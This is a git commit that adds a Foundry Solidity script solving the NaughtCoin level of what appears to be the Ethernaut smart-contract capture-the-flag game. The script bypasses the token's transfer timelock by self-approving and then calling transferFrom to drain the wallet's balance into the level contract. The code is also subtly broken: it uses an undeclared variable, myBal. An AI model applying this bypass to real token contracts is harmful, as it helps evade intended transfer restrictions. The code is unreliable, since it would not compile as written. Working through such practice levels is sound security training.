a046e56f2fb6174800c1c6cac4e4d4fb6beeb418
az0mb13 <qwertyuiop.dixit3@gmail.com>
2022-08-27 20:10:45 +0530

    Level 15 - NaughtCoin - Done

---
+++ script/level15.sol
@@ -0,0 +1,22 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import "forge-std/Script.sol";
+import "../instances/Ilevel15.sol";
+
+contract POC is Script {
+
+    NaughtCoin level15 = NaughtCoin(0x3212D0421E355a28150991E610d0e01fa7b7Cf66);
+
+    function run() external{
+        vm.startBroadcast();
+        address myWallet = 0xEAce4b71CA1A128e8B562561f46896D55B9B0246;
+        console.log("Current balance is: ", level15.balanceOf(myWallet));
+
+        level15.approve(myWallet, myBal);
+        level15.transferFrom(myWallet, address(level15), myBal);
+
+        console.log("New balance is: ", level15.balanceOf(myWallet));
+        vm.stopBroadcast();
+    }
+}
